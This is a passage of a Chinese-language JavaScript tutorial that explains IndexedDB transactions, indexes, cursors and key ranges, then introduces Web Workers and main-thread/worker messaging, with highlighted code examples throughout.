class="line"></span><br><span class="line">  transaction.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;transaction error: &#x27;</span> + transaction.<span class="property">error</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;demo&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> objectStoreRequest = objectStore.<span class="title function_">add</span>(&#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;add data success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> trans1 = db.<span class="title function_">transaction</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> trans2 = db.<span class="title function_">transaction</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore2 = trans2.<span class="title function_">objectStore</span>(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> objectStore1 = trans1.<span class="title function_">objectStore</span>(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">objectStore2.<span class="title function_">put</span>(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">objectStore1.<span class="title function_">put</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;key&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>key</code>对应的键值最终是<code>2</code>，而不是<code>1</code>。因为事务<code>trans1</code>先于<code>trans2</code>创建，所以首先执行。</p>
<p>注意，事务有可能失败，只有监听到事务的<code>complete</code>事件，才能保证事务操作成功。</p>
<p>IDBTransaction 对象有以下属性。</p>
<ul>
<li><code>IDBTransaction.db</code>：返回当前事务所在的数据库对象 IDBDatabase。</li>
<li><code>IDBTransaction.error</code>：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回<code>null</code>。</li>
<li><code>IDBTransaction.mode</code>：返回当前事务的模式，默认是<code>readonly</code>（只读），另一个值是<code>readwrite</code>。</li>
<li><code>IDBTransaction.objectStoreNames</code>：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。</li>
<li><code>IDBTransaction.onabort</code>：指定<code>abort</code>事件（事务中断）的监听函数。</li>
<li><code>IDBTransaction.oncomplete</code>：指定<code>complete</code>事件（事务成功）的监听函数。</li>
<li><code>IDBTransaction.onerror</code>：指定<code>error</code>事件（事务失败）的监听函数。</li>
</ul>
<p>IDBTransaction 对象有以下方法。</p>
<ul>
<li><code>IDBTransaction.abort()</code>：终止当前事务，回滚所有已经进行的变更。</li>
<li><code>IDBTransaction.objectStore(name)</code>：返回指定名称的对象仓库 IDBObjectStore。</li>
</ul>
<h3 id="9、IDBIndex-对象"><a href="#9、IDBIndex-对象" class="headerlink" title="9、IDBIndex 对象"></a>9、IDBIndex 对象</h3><p>IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。</p>
<p>IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。</p>
<p><code>IDBObjectStore.index()</code>方法可以获取 IDBIndex 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;contactsList&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;contactsList&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> myIndex = objectStore.<span class="title function_">index</span>(<span class="string">&#x27;lName&#x27;</span>);</span><br><span class="line"></span><br><span class="line">myIndex.<span class="title function_">openCursor</span>().<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="keyword">var</span> tableRow = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;tr&#x27;</span>);</span><br><span class="line">    tableRow.<span class="property">innerHTML</span> =   <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">id</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">lName</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">fName</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">jTitle</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">company</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">eMail</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">phone</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span></span><br><span class="line">                         + <span class="string">&#x27;&lt;td&gt;&#x27;</span> + cursor.<span class="property">value</span>.<span class="property">age</span> + <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">    tableEntry.<span class="title function_">appendChild</span>(tableRow);</span><br><span class="line"></span><br><span class="line">    cursor.<span class="title function_">continue</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entries all displayed.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBIndex 对象有以下属性。</p>
<ul>
<li><code>IDBIndex.name</code>：字符串，索引的名称。</li>
<li><code>IDBIndex.objectStore</code>：索引所在的对象仓库。</li>
<li><code>IDBIndex.keyPath</code>：索引的主键。</li>
<li><code>IDBIndex.multiEntry</code>：布尔值，针对<code>keyPath</code>为数组的情况，如果设为<code>true</code>，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。</li>
<li><code>IDBIndex.unique</code>：布尔值，表示创建索引时是否允许相同的主键。</li>
</ul>
<p>IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。</p>
<ul>
<li><code>IDBIndex.count()</code>：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。</li>
<li><code>IDBIndex.get(key)</code>：用来获取符合指定主键的数据记录。</li>
<li><code>IDBIndex.getKey(key)</code>：用来获取指定的主键。</li>
<li><code>IDBIndex.getAll()</code>：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。</li>
<li><code>IDBIndex.getAllKeys()</code>：该方法与<code>IDBIndex.getAll()</code>方法相似，区别是获取所有主键。</li>
<li><code>IDBIndex.openCursor()</code>：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。</li>
<li><code>IDBIndex.openKeyCursor()</code>：该方法与<code>IDBIndex.openCursor()</code>方法相似，区别是遍历所有条目的主键。</li>
</ul>
<h3 id="10、IDBCursor-对象"><a href="#10、IDBCursor-对象" class="headerlink" title="10、IDBCursor 对象"></a>10、IDBCursor 对象</h3><p>IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。</p>
<p>IDBCursor 对象一般通过<code>IDBObjectStore.openCursor()</code>方法获得。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;rushAlbumList&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;rushAlbumList&#x27;</span>);</span><br><span class="line"></span><br><span class="line">objectStore.<span class="title function_">openCursor</span>(<span class="literal">null</span>, <span class="string">&#x27;next&#x27;</span>).<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="keyword">var</span> listItem = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">      listItem.<span class="property">innerHTML</span> = cursor.<span class="property">value</span>.<span class="property">albumTitle</span> + <span class="string">&#x27;, &#x27;</span> + cursor.<span class="property">value</span>.<span class="property">year</span>;</span><br><span class="line">      list.<span class="title function_">appendChild</span>(listItem);</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(cursor.<span class="property">source</span>);</span><br><span class="line">      cursor.<span class="title function_">continue</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entries all displayed.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBCursor 对象的属性。</p>
<ul>
<li><code>IDBCursor.source</code>：返回正在遍历的对象仓库或索引。</li>
<li><code>IDBCursor.direction</code>：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过<code>IDBObjectStore.openCursor()</code>方法的第二个参数指定，一旦指定就不能改变了。</li>
<li><code>IDBCursor.key</code>：返回当前记录的主键。</li>
<li><code>IDBCursor.value</code>：返回当前记录的数据值。</li>
<li>IDBCursor.primaryKey：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。</li>
</ul>
<p>IDBCursor 对象有如下方法。</p>
<ul>
<li><code>IDBCursor.advance(n)</code>：指针向前移动 n 个位置。</li>
<li><code>IDBCursor.continue()</code>：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。</li>
<li><code>IDBCursor.continuePrimaryKey()</code>：该方法需要两个参数，第一个是<code>key</code>，第二个是<code>primaryKey</code>，将指针移到符合这两个参数的位置。</li>
<li><code>IDBCursor.delete()</code>：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。</li>
<li><code>IDBCursor.update()</code>：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。</li>
</ul>
<h3 id="11、IDBKeyRange-对象"><a href="#11、IDBKeyRange-对象" class="headerlink" title="11、IDBKeyRange 对象"></a>11、IDBKeyRange 对象</h3><p>IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。</p>
<p>IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。</p>
<ul>
<li><code>IDBKeyRange.lowerBound()</code>：指定下限。</li>
<li><code>IDBKeyRange.upperBound()</code>：指定上限。</li>
<li><code>IDBKeyRange.bound()</code>：同时指定上下限。</li>
<li><code>IDBKeyRange.only()</code>：指定只包含一个值。</li>
</ul>
<p>下面是一些代码实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All keys ≤ x</span></span><br><span class="line"><span class="keyword">var</span> r1 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">upperBound</span>(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &lt; x</span></span><br><span class="line"><span class="keyword">var</span> r2 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">upperBound</span>(x, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ y</span></span><br><span class="line"><span class="keyword">var</span> r3 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">lowerBound</span>(y);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; y</span></span><br><span class="line"><span class="keyword">var</span> r4 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">lowerBound</span>(y, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ x &amp;&amp; ≤ y</span></span><br><span class="line"><span class="keyword">var</span> r5 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(x, y);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; x &amp;&amp;&lt; y</span></span><br><span class="line"><span class="keyword">var</span> r6 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(x, y, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys &gt; x &amp;&amp; ≤ y</span></span><br><span class="line"><span class="keyword">var</span> r7 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(x, y, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All keys ≥ x &amp;&amp;&lt; y</span></span><br><span class="line"><span class="keyword">var</span> r8 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(x, y, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// The key = z</span></span><br><span class="line"><span class="keyword">var</span> r9 = <span class="title class_">IDBKeyRange</span>.<span class="title function_">only</span>(z);</span><br></pre></td></tr></table></figure>

<p><code>IDBKeyRange.lowerBound()</code>、<code>IDBKeyRange.upperBound()</code>、<code>IDBKeyRange.bound()</code>这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。</p>
<p>与之对应，IDBKeyRange 对象有四个只读属性。</p>
<ul>
<li><code>IDBKeyRange.lower</code>：返回下限</li>
<li><code>IDBKeyRange.lowerOpen</code>：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）</li>
<li><code>IDBKeyRange.upper</code>：返回上限</li>
<li><code>IDBKeyRange.upperOpen</code>：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）</li>
</ul>
<p>IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的<code>openCursor()</code>方法，就可以在所设定的范围内读取数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.<span class="title function_">transaction</span>([<span class="string">&#x27;people&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.<span class="title function_">objectStore</span>(<span class="string">&#x27;people&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.<span class="title function_">index</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> range = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line"></span><br><span class="line">index.<span class="title function_">openCursor</span>(range).<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> cursor = e.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cursor.<span class="property">key</span> + <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> field <span class="keyword">in</span> cursor.<span class="property">value</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(cursor.<span class="property">value</span>[field]);</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.<span class="title function_">continue</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDBKeyRange 有一个实例方法<code>includes(key)</code>，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> keyRangeValue = <span class="title class_">IDBKeyRange</span>.<span class="title function_">bound</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">keyRangeValue.<span class="title function_">includes</span>(<span class="string">&#x27;F&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">keyRangeValue.<span class="title function_">includes</span>(<span class="string">&#x27;W&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>



<h2 id="十五、Web-Worker"><a href="#十五、Web-Worker" class="headerlink" title="十五、Web Worker"></a>十五、Web Worker</h2><h3 id="1、概述-6"><a href="#1、概述-6" class="headerlink" title="1、概述"></a>1、概述</h3><p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>
<p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。</p>
<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>
<p>Web Worker 有以下几个使用注意点。</p>
<p>（1）<strong>同源限制</strong></p>
<p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>
<p>（2）<strong>DOM 限制</strong></p>
<p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以使用<code>navigator</code>对象和<code>location</code>对象。</p>
<p>（3）<strong>全局对象限制</strong></p>
<p>Worker 的全局对象<code>WorkerGlobalScope</code>，不同于网页的全局对象<code>Window</code>，很多接口拿不到。比如，理论上 Worker 线程不能使用<code>console.log</code>，因为标准里面没有提到 Worker 的全局对象存在<code>console</code>接口，只定义了<code>Navigator</code>接口和<code>Location</code>接口。不过，浏览器实际上支持 Worker 线程使用<code>console.log</code>，保险的做法还是不使用这个方法。</p>
<p>（4）<strong>通信联系</strong></p>
<p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p>
<p>（5）<strong>脚本限制</strong></p>
<p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>
<p>（6）<strong>文件限制</strong></p>
<p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。</p>
<h3 id="2、基本用法"><a href="#2、基本用法" class="headerlink" title="2、基本用法"></a>2、基本用法</h3><h4 id="2-1-主线程"><a href="#2-1-主线程" class="headerlink" title="2.1 主线程"></a>2.1 主线程</h4><p>主线程采用<code>new</code>命令，调用<code>Worker()</code>构造函数，新建一个 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;work.js&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。</p>
<p>然后，主线程调用<code>worker.postMessage()</code>方法，向 Worker 发消息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">worker.<span class="title function_">postMessage</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">worker.<span class="title function_">postMessage</span>(&#123;<span class="attr">method</span>: <span class="string">&#x27;echo&#x27;</span>, <span class="attr">args</span>: [<span class="string">&#x27;Work&#x27;</span>]&#125;);</span><br></pre></td></tr></table></figure>

<p><code>worker.postMessage()</code>方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。</p>
<p>接着，主线程通过<code>worker.onmessage</code>指定监听函数，接收子线程发回来的消息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">worker.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="title function_">doSomething</span>(event.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 执行任务</span></span><br><span class="line">  worker.<span class="title function_">postMessage</span>(<span class="string">&#x27;Work done!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，事件对象的<code>data</code>属性可以获取 Worker 发来的数据。</p>
<p>Worker 完成任务以后，主线程就可以把它关掉。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.<span class="title function_">terminate</span>();</span><br></pre></td></tr></table></figure>

<h4 id="2-2-Worker-线程"><a href="#2-2-Worker-线程" class="headerlink" title="2.2 Worker 线程"></a>2.2 Worker 线程</h4><p>Worker 线程内部需要有一个监听函数，监听<code>message</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  self.<span class="title function_">postMessage</span>(<span class="string">&#x27;You said: &#x27;</span> + e.<span class="property">data</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>self</code>代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;You said: &#x27;</span> + e.<span class="property">data</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="title function_">postMessage</span>(<span class="string">&#x27;You said: &#x27;</span> + e.<span class="property">data</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>除了使用<code>self.addEventListener()</code>指定监听函数，也可以使用<code>self.onmessage</code>指定。监听函数的参数是一个事件对象，它的<code>data</code>属性包含主线程发来的数据。<code>self.postMessage()</code>方法用来向主线程发送消息。</p>
<p>根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = e.<span class="property">data</span>;</span><br><span class="line">  <span class="keyword">switch</span> (data.<span class="property">cmd</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;start&#x27;</span>:</span><br><span class="line">      self.<span class="title function_">postMessage</span>(<span class="string">&#x27;WORKER STARTED: &#x27;</span> + data.<span class="property">msg</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">      self.<span class="title function_">postMessage</span>(<span class="string">&#x27;WORKER STOPPED: &#x27;</span> + data.<span class="property">msg</span>);</span><br><span class="line">      self.<span class="title function_">close</span>(); <span class="comment">// Terminates the worker.</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      self.<span class="title function_">postMessage</span>(<span class="string">&#x27;Unknown command: &#x27;</span> + data.<span class="property">msg</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>self.close()</code>用于在 Worker 内部关闭自身。</p>
